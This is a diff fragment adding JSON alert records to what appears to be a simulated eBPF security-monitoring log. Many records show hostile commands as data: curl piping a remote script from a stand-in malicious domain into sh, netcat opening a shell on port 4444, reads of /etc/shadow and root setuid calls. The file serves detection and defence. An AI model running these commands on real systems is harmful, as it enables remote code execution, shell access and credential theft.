+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 10581,
+        "ppid": 473,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7572837004351884",
+      "timestamp": "2026-09-23T04:22:19Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 24967, Parent PPID 384) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=384 pid=24967 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 24967,
+        "ppid": 384,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.11187604007262131",
+      "timestamp": "2026-09-23T04:22:18Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 10523, Parent PPID 909) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=909 pid=10523 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 10523,
+        "ppid": 909,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.847074031288488",
+      "timestamp": "2026-09-23T04:22:17Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 28996, Parent PPID 33) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=33 pid=28996 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 28996,
+        "ppid": 33,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.617604184380833",
+      "timestamp": "2026-09-23T04:22:16Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 30447, Parent PPID 767) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=767 pid=30447 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 30447,
+        "ppid": 767,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.19457981671325963",
+      "timestamp": "2026-09-23T04:22:16Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 28926, Parent PPID 371) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=371 pid=28926 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 28926,
+        "ppid": 371,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.31487710221233856",
+      "timestamp": "2026-09-23T04:22:15Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 19571, Parent PPID 782) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=782 pid=19571 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 19571,
+        "ppid": 782,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7065284691488369",
+      "timestamp": "2026-09-23T04:22:14Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 18620, Parent PPID 210) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=210 pid=18620 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 18620,
+        "ppid": 210,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7342696990846124",
+      "timestamp": "2026-09-23T04:22:13Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: write on python3",
+      "severity": "low",
+      "details": "Process 'python3' (PID 17548, Parent PPID 954) executed system call 'write' with args 'fd: 1 (stdout), length: 14'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=write ppid=954 pid=17548 comm=python3 args=fd: 1 (stdout), length: 14 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 17548,
+        "ppid": 954,
+        "comm": "python3",
+        "syscall": "write",
+        "args": "fd: 1 (stdout), length: 14",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.10527619484775508",
+      "timestamp": "2026-09-23T04:22:12Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 13592, Parent PPID 534) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=534 pid=13592 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 13592,
+        "ppid": 534,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.6328756353452719",
+      "timestamp": "2026-09-23T04:22:12Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: accept4 on nginx",
+      "severity": "low",
+      "details": "Process 'nginx' (PID 8486, Parent PPID 235) executed system call 'accept4' with args 'client: 192.168.1.55:53299'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=accept4 ppid=235 pid=8486 comm=nginx args=client: 192.168.1.55:53299 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 8486,
+        "ppid": 235,
+        "comm": "nginx",
+        "syscall": "accept4",
+        "args": "client: 192.168.1.55:53299",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.5885388997492699",
+      "timestamp": "2026-09-23T04:22:11Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: write on python3",
+      "severity": "low",
+      "details": "Process 'python3' (PID 11320, Parent PPID 503) executed system call 'write' with args 'fd: 1 (stdout), length: 14'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=write ppid=503 pid=11320 comm=python3 args=fd: 1 (stdout), length: 14 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 11320,
+        "ppid": 503,
+        "comm": "python3",
+        "syscall": "write",
+        "args": "fd: 1 (stdout), length: 14",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.4522932097479947",
+      "timestamp": "2026-09-23T04:22:10Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 16215, Parent PPID 585) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=585 pid=16215 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 16215,
+        "ppid": 585,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7304752759307354",
+      "timestamp": "2026-09-23T04:22:09Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 13016, Parent PPID 900) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=900 pid=13016 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 13016,
+        "ppid": 900,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.790429936685575",
+      "timestamp": "2026-09-23T04:22:08Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 12912, Parent PPID 440) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=440 pid=12912 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 12912,
+        "ppid": 440,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.19848938229720936",
+      "timestamp": "2026-09-23T04:22:08Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: epoll_wait on systemd",
+      "severity": "low",
+      "details": "Process 'systemd' (PID 23780, Parent PPID 346) executed system call 'epoll_wait' with args 'maxevents: 32'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=epoll_wait ppid=346 pid=23780 comm=systemd args=maxevents: 32 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 23780,
+        "ppid": 346,
+        "comm": "systemd",
+        "syscall": "epoll_wait",
+        "args": "maxevents: 32",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.4889046182392367",
+      "timestamp": "2026-09-23T04:22:07Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: accept4 on nginx",
+      "severity": "low",
+      "details": "Process 'nginx' (PID 32711, Parent PPID 193) executed system call 'accept4' with args 'client: 192.168.1.55:53299'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=accept4 ppid=193 pid=32711 comm=nginx args=client: 192.168.1.55:53299 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 32711,
+        "ppid": 193,
+        "comm": "nginx",
+        "syscall": "accept4",
+        "args": "client: 192.168.1.55:53299",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.8165312910816385",
+      "timestamp": "2026-09-23T04:22:06Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 15729, Parent PPID 82) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=82 pid=15729 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 15729,
+        "ppid": 82,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.14630725474263095",
+      "timestamp": "2026-09-23T04:22:05Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 3068, Parent PPID 86) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=86 pid=3068 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 3068,
+        "ppid": 86,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.38906416491861573",
+      "timestamp": "2026-09-23T04:22:04Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 19609, Parent PPID 491) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=491 pid=19609 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 19609,
+        "ppid": 491,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.3961744326616442",
+      "timestamp": "2026-09-23T04:22:04Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 20257, Parent PPID 253) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=253 pid=20257 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 20257,
+        "ppid": 253,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.8083373030665973",
+      "timestamp": "2026-09-23T04:22:03Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 22909, Parent PPID 611) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=611 pid=22909 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 22909,
+        "ppid": 611,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.48872361201724746",
+      "timestamp": "2026-09-23T04:22:02Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 24901, Parent PPID 957) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=957 pid=24901 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 24901,
+        "ppid": 957,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.560050284430097",
+      "timestamp": "2026-09-23T04:22:01Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 30145, Parent PPID 491) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=491 pid=30145 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 30145,
+        "ppid": 491,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    }
+  ]
+}
